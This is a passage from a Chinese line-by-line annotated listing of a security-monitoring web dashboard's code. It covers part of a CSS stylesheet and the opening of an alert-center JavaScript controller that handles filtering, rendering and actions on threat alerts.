| 141 | 空行：分隔样式规则。 | `&nbsp;` |
| 142 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 143 | 样式注释：说明这一段 CSS 的用途。 | ` * 排版层级` |
| 144 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 145 | 样式语句：参与页面视觉布局。 | `h1,` |
| 146 | 样式语句：参与页面视觉布局。 | `h2,` |
| 147 | 样式语句：参与页面视觉布局。 | `h3,` |
| 148 | 选择器：指定接下来要设置样式的页面元素。 | `h4 {` |
| 149 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-md);` |
| 150 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 151 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 152 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.3;` |
| 153 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 154 | 空行：分隔样式规则。 | `&nbsp;` |
| 155 | 选择器：指定接下来要设置样式的页面元素。 | `h1 {` |
| 156 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h1);` |
| 157 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 158 | 空行：分隔样式规则。 | `&nbsp;` |
| 159 | 选择器：指定接下来要设置样式的页面元素。 | `h2 {` |
| 160 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h2);` |
| 161 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.35;` |
| 162 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 163 | 空行：分隔样式规则。 | `&nbsp;` |
| 164 | 选择器：指定接下来要设置样式的页面元素。 | `h3 {` |
| 165 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h3);` |
| 166 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.4;` |
| 167 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 168 | 空行：分隔样式规则。 | `&nbsp;` |
| 169 | 选择器：指定接下来要设置样式的页面元素。 | `p {` |
| 170 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-md);` |
| 171 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 172 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 173 | 空行：分隔样式规则。 | `&nbsp;` |
| 174 | 样式语句：参与页面视觉布局。 | `small,` |
| 175 | 选择器：指定接下来要设置样式的页面元素。 | `.caption {` |
| 176 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 177 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 178 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 179 | 空行：分隔样式规则。 | `&nbsp;` |
| 180 | 选择器：指定接下来要设置样式的页面元素。 | `a {` |
| 181 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 182 | 样式属性：设置 `text-decoration` 的视觉或布局效果。 | `  text-decoration: none;` |
| 183 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: color 0.15s ease;` |
| 184 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 185 | 空行：分隔样式规则。 | `&nbsp;` |
| 186 | 选择器：指定接下来要设置样式的页面元素。 | `a:hover {` |
| 187 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald-hover);` |
| 188 | 样式属性：设置 `text-decoration` 的视觉或布局效果。 | `  text-decoration: underline;` |
| 189 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 190 | 空行：分隔样式规则。 | `&nbsp;` |
| 191 | 样式语句：参与页面视觉布局。 | `code,` |
| 192 | 样式语句：参与页面视觉布局。 | `kbd,` |
| 193 | 样式语句：参与页面视觉布局。 | `pre,` |
| 194 | 选择器：指定接下来要设置样式的页面元素。 | `.mono {` |
| 195 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 196 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 197 | 样式属性：设置 `font-feature-settings` 的视觉或布局效果。 | `  font-feature-settings: "calt" 0;` |
| 198 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 199 | 空行：分隔样式规则。 | `&nbsp;` |
| 200 | 样式语句：参与页面视觉布局。 | `.num-tabular,` |
| 201 | 样式语句：参与页面视觉布局。 | `.metric-value,` |
| 202 | 选择器：指定接下来要设置样式的页面元素。 | `.stat-value {` |
| 203 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 204 | 样式属性：设置 `font-feature-settings` 的视觉或布局效果。 | `  font-feature-settings: "tnum";` |
| 205 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 206 | 空行：分隔样式规则。 | `&nbsp;` |
| 207 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 208 | 样式注释：说明这一段 CSS 的用途。 | ` * 辅助工具` |
| 209 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 210 | 选择器：指定接下来要设置样式的页面元素。 | `.text-primary {` |
| 211 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 212 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 213 | 空行：分隔样式规则。 | `&nbsp;` |
| 214 | 选择器：指定接下来要设置样式的页面元素。 | `.text-secondary {` |
| 215 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 216 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 217 | 空行：分隔样式规则。 | `&nbsp;` |
| 218 | 选择器：指定接下来要设置样式的页面元素。 | `.text-tertiary {` |
| 219 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 220 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 221 | 空行：分隔样式规则。 | `&nbsp;` |
| 222 | 选择器：指定接下来要设置样式的页面元素。 | `.text-emerald {` |
| 223 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 224 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 225 | 空行：分隔样式规则。 | `&nbsp;` |
| 226 | 选择器：指定接下来要设置样式的页面元素。 | `.text-danger {` |
| 227 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 228 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 229 | 空行：分隔样式规则。 | `&nbsp;` |
| 230 | 选择器：指定接下来要设置样式的页面元素。 | `.text-warning {` |
| 231 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 232 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 233 | 空行：分隔样式规则。 | `&nbsp;` |
| 234 | 选择器：指定接下来要设置样式的页面元素。 | `.text-info {` |
| 235 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--info-blue);` |
| 236 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 237 | 空行：分隔样式规则。 | `&nbsp;` |
| 238 | 选择器：指定接下来要设置样式的页面元素。 | `.bg-surface {` |
| 239 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 240 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 241 | 空行：分隔样式规则。 | `&nbsp;` |
| 242 | 选择器：指定接下来要设置样式的页面元素。 | `.divider {` |
| 243 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 1px;` |
| 244 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--border-subtle);` |
| 245 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: var(--space-lg) 0;` |
| 246 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 247 | 空行：分隔样式规则。 | `&nbsp;` |
| 248 | 选择器：指定接下来要设置样式的页面元素。 | `.sr-only {` |
| 249 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: absolute;` |
| 250 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 1px;` |
| 251 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 1px;` |
| 252 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 0;` |
| 253 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: -1px;` |
| 254 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: hidden;` |
| 255 | 样式属性：设置 `clip` 的视觉或布局效果。 | `  clip: rect(0, 0, 0, 0);` |
| 256 | 样式属性：设置 `white-space` 的视觉或布局效果。 | `  white-space: nowrap;` |
| 257 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 0;` |
| 258 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 259 | 空行：分隔样式规则。 | `&nbsp;` |
| 260 | 样式注释：说明这一段 CSS 的用途。 | `/* 页面容器 */` |
| 261 | 选择器：指定接下来要设置样式的页面元素。 | `.page-body {` |
| 262 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-xl);` |
| 263 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 264 | 空行：分隔样式规则。 | `&nbsp;` |
| 265 | 选择器：指定接下来要设置样式的页面元素。 | `.page-title {` |
| 266 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 267 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 268 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 269 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 270 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 271 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 272 | 空行：分隔样式规则。 | `&nbsp;` |
| 273 | 选择器：指定接下来要设置样式的页面元素。 | `.page-title__meta {` |
| 274 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 275 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 276 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 277 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 278 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 279 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |

## `web/static/js/alerts.js`

- 类型：前端静态资源
- 行数：772

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * alerts.js — 告警中心控制器（Phase 7，DESIGN.md §8.2）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 维护筛选状态（level / status / range / type / q）并与 UI 双向绑定` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. 调用 /api/alerts 拉取分页列表（读取 X-Total-Count 响应头）` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. 点击列表项 → 调 /api/alerts/<id> 拉详情 → 填充右侧抽屉` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *   4. 抽屉操作：确认 / 处理 / 忽略 / 封禁来源 IP（联动 /api/banned_ips）` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` *   5. 订阅 WebSocket \`alert\` / \`alert_updated\` 事件，实时前插与状态同步` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 11 | 注释：说明前端逻辑或交互意图。 | ` * 不直接操作 DOM 之外的全局状态；所有网络调用统一走 window.AGApi.fetchApi。` |
| 12 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 13 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 14 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 15 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 16 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return;` |
| 17 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 18 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, formatTime, levelBadge, toast } = window.AGUI;` |
| 19 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 20 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const LEVELS = ["low", "medium", "high", "critical"];` |
| 21 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const STATUSES = ["open", "acknowledged", "resolved", "ignored"];` |
| 22 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const STATUS_LABEL = {` |
| 23 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    open: "未处理",` |
| 24 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    acknowledged: "已确认",` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    resolved: "已处理",` |
| 26 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    ignored: "已忽略",` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 28 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const PAGE_SIZE = 50;` |
| 29 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const AUTO_REFRESH_MS = 15000;` |
| 30 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 31 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 32 | 注释：说明前端逻辑或交互意图。 | `   * 状态` |
| 33 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 34 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const state = {` |
| 35 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    level: "",` |
| 36 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    status: "",` |
| 37 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    range: "24h",` |
| 38 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    type: "",` |
| 39 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    q: "",` |
| 40 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    offset: 0,` |
| 41 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    total: 0,` |
| 42 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    cache: new Map(), // id -> alert` |
| 43 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    activeId: null,` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    autoRefresh: false,` |
| 45 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    autoTimer: null,` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 47 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 48 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 49 | 注释：说明前端逻辑或交互意图。 | `   * DOM 引用` |
| 50 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 51 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const el = {` |
| 52 | DOM 查询：定位页面元素以便读取或更新。 | `    list: document.getElementById("alert-list"),` |
| 53 | DOM 查询：定位页面元素以便读取或更新。 | `    countFiltered: document.getElementById("count-filtered"),` |
| 54 | DOM 查询：定位页面元素以便读取或更新。 | `    countTotal: document.getElementById("count-total"),` |
| 55 | DOM 查询：定位页面元素以便读取或更新。 | `    countOpen: document.getElementById("count-open"),` |
| 56 | DOM 查询：定位页面元素以便读取或更新。 | `    activeChips: document.getElementById("active-chips"),` |
| 57 | DOM 查询：定位页面元素以便读取或更新。 | `    listStatus: document.getElementById("list-status"),` |
| 58 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 59 | DOM 查询：定位页面元素以便读取或更新。 | `    btnLevelGroup: document.querySelectorAll(".btn-group [data-level]"),` |
| 60 | DOM 查询：定位页面元素以便读取或更新。 | `    selStatus: document.getElementById("filter-status"),` |
| 61 | DOM 查询：定位页面元素以便读取或更新。 | `    selRange: document.getElementById("filter-range"),` |
| 62 | DOM 查询：定位页面元素以便读取或更新。 | `    selType: document.getElementById("filter-type"),` |
| 63 | DOM 查询：定位页面元素以便读取或更新。 | `    inputQ: document.getElementById("filter-query"),` |
| 64 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 65 | DOM 查询：定位页面元素以便读取或更新。 | `    btnRefresh: document.getElementById("btn-refresh"),` |
| 66 | DOM 查询：定位页面元素以便读取或更新。 | `    btnLoadMore: document.getElementById("btn-load-more"),` |
| 67 | DOM 查询：定位页面元素以便读取或更新。 | `    btnSeed: document.getElementById("btn-seed"),` |
| 68 | DOM 查询：定位页面元素以便读取或更新。 | `    toggleAuto: document.getElementById("toggle-autorefresh"),` |
| 69 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 70 | DOM 查询：定位页面元素以便读取或更新。 | `    drawer: document.getElementById("alert-drawer"),` |
| 71 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerOverlay: document.getElementById("drawer-overlay"),` |
| 72 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerClose: document.getElementById("drawer-close"),` |
| 73 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 74 | DOM 查询：定位页面元素以便读取或更新。 | `    dTitle: document.getElementById("drawer-title-text"),` |
| 75 | DOM 查询：定位页面元素以便读取或更新。 | `    dLevelBadge: document.getElementById("drawer-level-badge"),` |
| 76 | DOM 查询：定位页面元素以便读取或更新。 | `    dId: document.getElementById("d-id"),` |
| 77 | DOM 查询：定位页面元素以便读取或更新。 | `    dTime: document.getElementById("d-time"),` |
| 78 | DOM 查询：定位页面元素以便读取或更新。 | `    dType: document.getElementById("d-type"),` |
| 79 | DOM 查询：定位页面元素以便读取或更新。 | `    dStatus: document.getElementById("d-status"),` |
| 80 | DOM 查询：定位页面元素以便读取或更新。 | `    dSource: document.getElementById("d-source"),` |
| 81 | DOM 查询：定位页面元素以便读取或更新。 | `    dDest: document.getElementById("d-dest"),` |
| 82 | DOM 查询：定位页面元素以便读取或更新。 | `    dProto: document.getElementById("d-proto"),` |
| 83 | DOM 查询：定位页面元素以便读取或更新。 | `    dAction: document.getElementById("d-action"),` |
| 84 | DOM 查询：定位页面元素以便读取或更新。 | `    dModel: document.getElementById("d-model"),` |
| 85 | DOM 查询：定位页面元素以便读取或更新。 | `    dConfidence: document.getElementById("d-confidence"),` |
| 86 | DOM 查询：定位页面元素以便读取或更新。 | `    dConfidenceBar: document.getElementById("d-confidence-bar"),` |
| 87 | DOM 查询：定位页面元素以便读取或更新。 | `    dExplanation: document.getElementById("d-explanation"),` |
| 88 | DOM 查询：定位页面元素以便读取或更新。 | `    dFeatures: document.querySelector("#d-features tbody"),` |
| 89 | DOM 查询：定位页面元素以便读取或更新。 | `    dRaw: document.getElementById("d-raw"),` |
| 90 | DOM 查询：定位页面元素以便读取或更新。 | `    dIndicatorsSection: document.getElementById("d-indicators-section"),` |
| 91 | DOM 查询：定位页面元素以便读取或更新。 | `    dIndicators: document.getElementById("d-indicators"),` |
| 92 | DOM 查询：定位页面元素以便读取或更新。 | `    dHistorySection: document.getElementById("d-history-section"),` |
| 93 | DOM 查询：定位页面元素以便读取或更新。 | `    dHistory: document.getElementById("d-history"),` |
| 94 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 95 | DOM 查询：定位页面元素以便读取或更新。 | `    btnIgnore: document.getElementById("btn-ignore"),` |
| 96 | DOM 查询：定位页面元素以便读取或更新。 | `    btnAck: document.getElementById("btn-ack"),` |
| 97 | DOM 查询：定位页面元素以便读取或更新。 | `    btnResolve: document.getElementById("btn-resolve"),` |
| 98 | DOM 查询：定位页面元素以便读取或更新。 | `    btnBan: document.getElementById("btn-ban"),` |
| 99 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 100 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 101 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 102 | 注释：说明前端逻辑或交互意图。 | `   * 工具` |
| 103 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 104 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function rangeSince(key) {` |
| 105 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const now = Date.now();` |
| 106 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    switch (key) {` |
| 107 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      case "1h":` |
| 108 | 返回结果：把计算值交给调用方。 | `        return new Date(now - 60 * 60 * 1000).toISOString();` |
| 109 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      case "24h":` |
| 110 | 返回结果：把计算值交给调用方。 | `        return new Date(now - 24 * 60 * 60 * 1000).toISOString();` |
| 111 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      case "7d":` |
| 112 | 返回结果：把计算值交给调用方。 | `        return new Date(now - 7 * 24 * 60 * 60 * 1000).toISOString();` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      case "30d":` |
| 114 | 返回结果：把计算值交给调用方。 | `        return new Date(now - 30 * 24 * 60 * 60 * 1000).toISOString();` |
| 115 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      case "all":` |
| 116 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      default:` |
| 117 | 返回结果：把计算值交给调用方。 | `        return "";` |
| 118 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 119 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 120 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 121 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function debounce(fn, wait) {` |
| 122 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let t = null;` |
| 123 | 返回结果：把计算值交给调用方。 | `    return function debounced(...args) {` |
| 124 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      clearTimeout(t);` |
| 125 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      t = setTimeout(() => fn.apply(null, args), wait);` |
| 126 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 128 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 129 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function levelText(level) {` |
| 130 | 返回结果：把计算值交给调用方。 | `    return (` |
| 131 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      { low: "低危", medium: "中危", high: "高危", critical: "严重" }[level] \|\|` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      level` |
| 133 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 134 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 135 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 136 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function statusText(status) {` |
| 137 | 返回结果：把计算值交给调用方。 | `    return STATUS_LABEL[status] \|\| status \|\| "—";` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 139 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 140 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function statusPill(status) {` |
| 141 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const safe = STATUSES.includes(status) ? status : "open";` |
| 142 | 返回结果：把计算值交给调用方。 | `    return (` |
| 143 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="alert-item__status alert-item__status--' +` |
| 144 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe +` |
| 145 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 146 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(statusText(safe)) +` |
| 147 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 149 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 150 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 151 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 152 | 注释：说明前端逻辑或交互意图。 | `   * 渲染` |
| 153 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 154 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderList(items, { append = false, markNew = false } = {}) {` |
| 155 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!append && (!items \|\| items.length === 0)) {` |
| 156 | 页面更新：修改元素内容、样式或状态。 | `      el.list.innerHTML =` |
| 157 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<li class="alert-list__empty">' +` |
| 158 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state">' +` |
| 159 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__title">当前筛选下暂无告警</div>' +` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__hint">调整筛选条件，或等待新事件到达</div>' +` |
| 161 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</div></li>";` |
| 162 | 返回结果：把计算值交给调用方。 | `      return;` |
| 163 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 164 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const html = items.map((item) => renderListItem(item, markNew)).join("");` |
| 165 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (append) {` |
| 166 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.list.insertAdjacentHTML("beforeend", html);` |
| 167 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } else {` |
| 168 | 页面更新：修改元素内容、样式或状态。 | `      el.list.innerHTML = html;` |
| 169 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 170 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 171 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 172 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderListItem(alert, markNew = false) {` |
| 173 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const level = LEVELS.includes(alert.level) ? alert.level : "low";` |
| 174 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const title = escapeHtml(alert.title \|\| alert.summary \|\| "未分类告警");` |
| 175 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const summary = escapeHtml(alert.summary \|\| "");` |
| 176 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const sourceIp = alert.source_ip ? escapeHtml(alert.source_ip) : "";` |
| 177 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const time = escapeHtml(formatTime(alert.timestamp));` |
| 178 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const threatType = escapeHtml(alert.threat_type \|\| "unknown");` |
| 179 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const newClass = markNew ? " alert-item--new" : "";` |
| 180 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 181 | 返回结果：把计算值交给调用方。 | `    return (` |
| 182 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<li class="alert-item alert-item--clickable alert-item--' +` |
| 183 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      level +` |
| 184 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      newClass +` |
| 185 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '" data-id="' +` |
| 186 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(alert.id \|\| "") +` |
| 187 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '" role="listitem" tabindex="0">' +` |
| 188 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="alert-item__stripe"></span>' +` |
| 189 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__content">' +` |
| 190 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__title-row">' +` |
| 191 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      levelBadge(level) +` |
| 192 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="alert-item__title">' +` |
| 193 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      title +` |
| 194 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 195 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 196 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (summary && summary !== title` |
| 197 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<p class="alert-item__summary">' + summary + "</p>"` |
| 198 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__meta">' +` |
| 200 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<span>" +` |
| 201 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      time +` |
| 202 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 203 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (sourceIp` |
